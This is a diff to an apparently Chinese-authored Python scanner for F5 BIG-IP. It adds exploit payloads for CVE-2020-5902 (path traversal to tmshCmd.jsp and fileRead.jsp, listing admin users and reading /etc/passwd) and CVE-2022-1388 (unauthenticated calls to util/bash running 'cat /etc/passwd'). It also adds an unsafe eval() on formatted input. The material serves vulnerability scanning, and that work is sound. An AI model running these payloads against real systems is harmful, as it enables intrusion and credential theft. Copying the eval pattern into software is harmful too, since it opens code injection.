@@ -1,9 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-''' 该POC没有经过实际环境验证, 如需启用该POC, 请参考文件最底部的提示, 并根据提示自行启用(或等作者验证POC可靠性之后, 在新版本中启用)
-暂未找到漏洞环境, 还没测试POC准确性
-
+'''
     F5-BIG-IP扫描类: 
         1. F5-BIG-IP 远程代码执行
             CVE-2020-5902
@@ -46,6 +44,18 @@ class F5_BIG_IP():
                 'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd',
                 'data': ''
             },
+            {
+                'path': 'login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin',
+                'data': ''
+            },
+            {
+                'path': 'login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxx',
+                'data': ''
+            },
+            {
+                'path': 'login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd',
+                'data': ''
+            },
             # {
             #     'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=C:\Windows\System32\drivers\etc\hosts',
             #     'data': ''
@@ -59,6 +69,14 @@ class F5_BIG_IP():
         self.cve_2022_1388_payloads = [
             {
                 'path': 'mgmt/tm/util/bash',
+                'data': '{"command": "run", "utilCmdArgs": "-c \'cat /etc/passwd\'"}'
+            },
+            {
+                'path': 'tm/util/bash',
+                'data': '{"command": "run", "utilCmdArgs": "-c \'cat /etc/passwd\'"}'
+            },
+            {
+                'path': 'util/bash',
                 'data': '{"command": "run", "utilCmdArgs": "-c \'cat /etc/passwd\'"}'
             }
         ]
@@ -190,7 +208,10 @@ class F5_BIG_IP():
                 }
                 return results
 
-    def addscan(self, url):
+    def addscan(self, url, vuln=None):
+        if vuln:
+            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+
         return [
             thread(target=self.cve_2020_5902_scan, url=url),
             thread(target=self.cve_2022_1388_scan, url=url)
